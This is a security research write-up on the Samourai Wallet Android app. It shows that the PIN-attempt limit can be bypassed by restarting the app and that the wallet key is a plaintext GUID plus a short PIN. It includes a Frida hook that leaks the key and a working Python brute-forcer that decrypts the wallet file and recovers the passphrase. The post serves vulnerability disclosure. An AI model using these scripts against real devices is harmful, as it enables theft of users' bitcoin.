## Introduction

Samourai Wallet is a free and open source (FOSS), non custodial Bitcoin wallet software that focus on privacy and anonymity when interacting with the Bitcoin network. It is available as a mobile application compatible with Android devices and the package can be downloaded directly from the website under the name [com.samourai.wallet](https://samouraiwallet.com/download/latest-apk) or you can find it on Google Play.

During this post, we will be looking into the PIN authentication mechanism and the underlying cryptographic implementation that protects the access to the application.

In addition, the project is licensed under the [GNU General Public License v3.0](https://code.samourai.io/wallet/samourai-wallet-android/-/blob/develop/LICENSE).

## Motivation

When I was testing the application and created a Bitcoin wallet, I noticed that a new seed (BIP39 12-word mnemonic) was generated together with a custom passphrase. Besides that, a PIN was chosen to unlock the wallet. The PIN is a number in the range of 5 to 8 digits.

However, everytime the app was started, the only requirement to access and fully control the wallet was to introduce the PIN number. This behavior lead me to think about the following questions:

* *Is the PIN number the only requirement to access the wallet?** *The data on device internal memory is stored securely using encryption?** *Can this data be decrypted with the PIN as a key?** *What is the risk if someone gains control over the device and application data?** *How safe are Bitcoins when using this wallet?*

To answer these questions we’ll dive into how the authentication and data encryption works on Samourai Wallet application.

## Creating a new wallet

The flow looks like this when starting the app for the first time:

After completing these steps, the wallet is created and we may access it as well as perform transactions, configure Whirlpool and other several features provided by the app.

## Bypassing login attempts

The first thing spotted was an error when introducing a wrong PIN while trying to login. The PIN will be the only requirement to use the application after creating or importing a wallet for the first time.

We only have 3 attempts to authenticate. After the 3rd failure, the application will reset to its original state and require the passphrase to be introduced in order to unlock the wallet.

However, the PIN failure counter is stateless because the number of attempts is not preserved (except in the memory during runtime). The counter is a variable that increments whenever the wallet decryption fails.

To **bypass** the 3 PIN attempts we can simply **restart the application** and the counter will reset.

## Reversing the application

How fast can we go if we intend to automate PIN testing? Testing each PIN one by one while restarting the app everytime is not feasible so we must find a way to automate this process.

Having a look at the source code:

  `| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ```  ``` try {     HD_Wallet hdw = PayloadUtil.getInstance(PinEntryActivity.this)                                             .restoreWalletfromJSON(                                                 new CharSequenceX(AccessFactory                                             .   getInstance(PinEntryActivity.this)                                                 .getGUID() + pin)); // Interesting       runOnUiThread(() -> {         progressBar.setVisibility(View.INVISIBLE);     });      if (hdw == null) {         runOnUiThread(() -> {             failures++; // Also interesting because we can hook the method                          // during rt and force 'failures = 0'             Toast.makeText(PinEntryActivity.this, PinEntryActivity.this                             .getText(R.string.login_error)             + ":" + failures + "/3", Toast.LENGTH_SHORT).show();              if (failures == 3) {                 failures = 0;                  doBackupRestore();             } else {  ``` | |
| --- | --- |`

Code snippet from *com.samourai.wallet.PinEntryActivity* class. The failures variable is just an attribute in the class.

To brute force the PIN we must replicate what the method *PayloadUtil.restoreWalletFromJson()* is doing.

Also, the PIN rules are defined in *AccessFactory* class:

  `| ``` 1 2  ```  ``` AccessFactory.MIN_PIN_LENGTH = 5; AccessFactory.MAX_PIN_LENGTH = 8;  ``` | |
| --- | --- |`

Doing some quick maths, there are a total of **10^5 + 10^6 + 10^7 + 10^8 = 111.100.000** total possible PINs using digits from 0 to 9 with a length of 5, 6, 7 & 8, respectively.

This is not an astronomic number. In fact, the PIN requirements are not even complex enough to be used in authentication.

## Leveraging Frida on runtime

The key used to decrypt the wallet is passed as argument to *PayloadUtil.restoreWalletFromJson()* method and it is an object of type *CharSequenceX*.

To inspect what kind of value is being passed we can use Frida and hook that particular method to read the passed argument when calling. The following Frida script will leak the contents of *key = getGUID() + pin*:

  `| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ```  ``` // Frida script: hook_restoreWalletFromJson.js Java.perform(() => {     // Import class     var CharSequenceX = "com.samourai.wallet.util.CharSequenceX";     var PayloadUtil = Java.use("com.samourai.wallet.payload.PayloadUtil");          // Overload method     PayloadUtil.restoreWalletfromJSON.overload(CharSequenceX).implementation =         function(key){             console.log("Called restoreWalletFromJson()\n");             console.log(key.toString());              // Continue the original call             return this.restoreWalletfromJSON(key);         }; });  ``` | |
| --- | --- |`

Running the following command will produce the output:

  `| ``` 1 2 3 4  ```  ``` $ frida -U --no-pause -f com.samourai.wallet -l hook_restoreWalletFromJson.js Spawned `com.samourai.wallet`. Resuming main thread!                     [Redmi 4A::com.samourai.wallet]-> Called restoreWalletFromJson() b35b2502-541d-4de7-9c95-76fa1d09f668b28da911e4191079f2038a8a6ec978e4fc325fc012345  ``` | |
| --- | --- |`

The key is a concatenation of GUID and PIN, i.e., *key = getGUID() + PIN*, such that:

* **GUID:** b35b2502-541d-4de7-9c95-76fa1d09f668b28da911e4191079f2038a8a6ec978e4fc325fc0* **PIN:** 12345

According to *AccessFactory.getGUID()* method there are 3 versions of GUID (v2, v3 & v4). In this release, the version 4 is being used for GUID so we may have a look at *FootprintUtil.getFootprintV4()*.

  `| ``` 1 2  ```  ``` strFootprint = Build.MANUFACTURER + Build.BRAND + Build.MODEL + Build.SERIAL; return RIPEMD160(strFootprint);  ``` | |
| --- | --- |`

In fact, the GUID is composed by *UUID.randomUUID()* and *FootprintUtil.getFootprintV4()* such that *guid = UUID.randomUUID().toString() + RIPEMD160(Build.MANUFACTURER + Build.BRAND + Build.MODEL + Build.SERIAL)*

The GUID is static and stored in plaintext on device storage using Android Shared Preferences API (*/data/data/com.samourai.wallet/shared\_prefs/com.samourai.wallet\_preferences.xml*).

Having the GUID will allow us to concatenate an arbitrary PIN number and test every possible combination while trying to decrypt the Bitcoin wallet, but first, we must understand the decryption process.

Key derivation & wallet decryption

Having a look at the driver method that decrypts wallet data:

  `| ``` 1 2 3 4 5 6 7 8  ```  ``` public synchronized HD_Wallet restoreWalletfromJSON(CharSequenceX password){  JSONObject obj = null;         try {             obj = deserialize(password, false);         } (...) return restoreWalletfromJSON(obj,false); }  ``` | |
| --- | --- |`

And also:

  `| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13  ```  ``` private synchronized JSONObject deserialize(CharSequenceX password, boolean useBackup){     private final static String dataDir = "wallet";     private final static String strFilename = "samourai.dat";     payload = jsonObj.getString("payload"); (...)     try {         if(version==1){             decrypted = AESUtil.decrypt(payload, password, AESUtil.DefaultPBKDF2Iterations);         }else if(version == 2){             decrypted = AESUtil.decryptSHA256(payload, password);         } (...) }  ``` | |
| --- | --- |`

From now on its pretty straightforward. By inspection we can assume it uses symmetric key encryption, in particular, AES-256-CBC. The version attribute has value 2 according to JSON object **samourai.dat** so it will call *AESUtil.decryptSHA256()* to perform decryption.

The method will create a new instance of KOpenSSL which is an implementation of cryptographic primitives in Kotlin and sets the value of *DefaultPBKDF2HMACSHA256Iterations*. In this case, PBKDF2 will force us to derive the correct key to use in decryption procedure by iterating 15.000 times (HMAC-SHA256).

Iterations have a computational cost, however, the current value is not significant enough given the weak password complexity (5 to 8 digit PIN number). For reference, 1Password software is currently using 100.000 iterations for key derivation.

In resume, the full decryption procedure is the following:

1. User input PIN- Key = GUID + PIN- Open “samourai.dat” file- Read “payload” attribute- Derive AES key using PBKDF2-HMAC-SHA256 (15.000 iters)- Perform AES decryption of payload (ciphertext) using the derived key

## Python Proof-of-Concept

  `| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  ```  ``` import json, hashlib from base64 import b64decode from Crypto.Cipher import AES from Crypto.Util.Padding import unpad  ''' Load our payload in base64 from "samourai.dat" ''' with open("samourai.dat", "r") as f:     samourai = json.loads(f.read())     payload = b64decode(samourai["payload"])  ''' Try PIN combinations (must use "zfill" to test left zeros) ''' ''' The correct PIN for this demo is "12345" (~30 seconds for 300 tries) ''' START = 12000 END = 12999 for i in range(START, END):     pin = str(i)     print(pin)          ''' Salt for key derivation (8 payload/ciphertext bytes from 8 to 16) '''     salt = payload[8:16].hex() # "1c5690f5acb17d4f"              ''' Password (GUID + PIN) (Can be recovered from "shared_preferences.xml" or Frida) '''     password = b"b35b2502-541d-4de7-9c95-76fa1d09f668b28da911e4191079f2038a8a6ec978e4fc325fc0" + pin.encode('utf-8')          iters = 15000      pbkdf2_hmac_key = hashlib.pbkdf2_hmac('sha256',                                       password, bytes.fromhex(salt),                                       iters,                                       dklen=256)     ''' 32 bytes '''     key = pbkdf2_hmac_key.hex()[:64]      ''' 16 bytes '''     iv = pbkdf2_hmac_key.hex()[64 : 64 + 32]      try:         cipher = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))         plaintext = unpad(cipher.decrypt(payload), AES.block_size)         plaintext = str(plaintext, 'latin-1')[32:]  ''' Ignore first 16 bytes (IV) '''          if "passphrase" in plaintext:             print("Decrypted payload: ", plaintext)             print("PIN: " + pin)             break     except:         pass  ``` | |

## Conclusion

The main outcome of this research is that the current authentication & respective cryptographic implementation used by Samourai is insufficient to protect the Bitcoin wallets of thousands users that installed and use the application. According to Play Store, there are a total of **100.000+ installs**.

In an event of mobile device theft, malware or even having the device seized by law enforcement will automatically put the Bitcoins at risk as it would only take approx. 111 million attempts to hit the correct PIN number.

Also, note that the provided PoC in Python is not optimized, at all, but it could be distributed to multiple machines in a divide & conquer approach and take advantage of concurrency, multithreading, etc.

We can estimate the required time to brute force all the PIN combinations using a simple laptop. If we can test 10 PINs per second, then it would take around 12 million seconds = 3333 hours = **140 days to test every PIN** (worst case scenario, non-optimized code, low-end cracking hardware).

Do you think a thief wouldn’t wait a few days to sweep your wallet? Think again.
